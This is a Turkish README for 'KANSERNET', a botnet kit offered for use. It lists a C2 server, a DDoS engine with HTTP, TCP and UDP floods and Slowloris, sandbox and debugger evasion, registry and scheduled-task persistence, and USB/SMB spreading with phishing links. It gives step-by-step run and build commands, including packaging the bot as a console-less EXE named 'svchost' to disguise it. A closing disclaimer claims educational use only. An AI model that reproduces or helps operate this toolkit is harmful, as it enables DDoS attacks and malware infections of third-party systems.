# KANSERNET v1.0 (Botnet)

AES-256 sifreli C2 iletisimine sahip, 5000 bot kapasiteli botnet agi. DDoS motoru, anti-analysis, persistence ve otomatik yayilma ozellikleriyle gelir.

---

## Dosya Yapisi

| Dosya | Aciklama |
|-------|----------|
| `c2_server.py` | Botnet C2 komuta kontrol sunucusu (GUI) — bot yonetimi, DDoS baslatma, log izleme |
| `bot.py` | Bot istemci (zombi) — C2'ye baglanir, komut bekler, DDoS ve yayilma gorevlerini calistirir |
| `builder.py` | Bot EXE builder — C2 adresi ve port gomulu EXE olusturur |
| `spreader.py` | Yayilma modulu — USB, SMB, phishing link uretimi |
| `config.json` | Botnet yapilandirmasi — C2 adresi, port, sifre, max bot sayisi |

---

## Ozellikler

- **AES-256 Sifreli C2** — Tum C2 iletisimi AES-256-CBC ile sifrelenir
- **5000 Bot Kapasitesi** — Tek sunucuda 5000 eş zamanli bot destegi
- **DDoS Motoru** — HTTP Flood, TCP Flood, UDP Flood, Slowloris
- **Anti-Analysis** — Sanal makine tespiti, debugger tespiti, sandbox kacirma
- **Persistence** — Registry Run key, Scheduled Task, Startup klasoru
- **Otomatik Yayilma** — USB surucuye kopyalama, SMB paylasim taramasi
- **SQLite Veritabani** — Tum botlar, saldirilar ve loglar `kansernet.db`'de saklanir
- **GUI Panel** — Tkinter tabanli, canli bot listesi, sistem bilgisi, saldiri yonetimi

---

## Gereksinimler

```bash
cd KanserTools
pip install -r requirements.txt
pip install cryptography
```

---

## Kullanim

### 1. C2 Sunucu (Komuta Kontrol)

```bash
cd botnet
python c2_server.py
```

GUI acilir. Varsayilan port: `6666`. Panel ozellikleri:
- **Bots** sekmesi: Bagli bot listesi, sistem bilgisi (OS, CPU, RAM), son gorulme zamani
- **Attack** sekmesi: DDoS baslatma — hedef IP/URL, metod secimi, sure, bot sayisi
- **Logs** sekmesi: Tum bot aktiviteleri ve hata loglari
- **Console** secili bota komut gonderme

### 2. Bot (Zombi Istemci)

```bash
# Direkt calistirma:
python bot.py

# config.json icinde C2_HOST ve C2_PORT ayarlanmalidir
```

Bot calistiginda:
1. C2 sunucuya AES sifreli baglanti kurar
2. Sistem bilgisini gonderir (OS, hostname, CPU, RAM)
3. Persistence kurar (registry + scheduled task)
4. Anti-analysis kontrollerini yapar
5. Komut bekler (DDoS, update, spread, uninstall)

### 3. Bot Builder

```bash
python builder.py
```

C2 adresi ve port sorulur, `bot_built.py` olusturulur. Ardindan EXE'ye cevrilebilir.

---

## EXE Builder (PyInstaller)

```bash
cd botnet

# Bot'u tek EXE yap:
pyinstaller --onefile --noconsole --name=svchost bot.py

# C2 sunucuyu EXE yap:
pyinstaller --onefile --name=KanserNet c2_server.py
```

---

## Monitor Reporter

`monitor_reporter.py`, bot ve C2 sunucu calistiginda otomatik import edilir. Yeni bot baglantisi, DDoS baslatma/durdurma, hata durumlari merkezi olarak raporlanir.

```python
from monitor_reporter import report
report("Botnet", "bot_connected", {"bot_id": "a1b2c3", "ip": "192.168.1.50"})
```

---

## Guvenlik Uyarisi

Bu arac **yalnizca kendi sistemlerinizde ve egitim/test amaciyla** kullanilmalidir. Izinsiz kullanim yasa disidir.
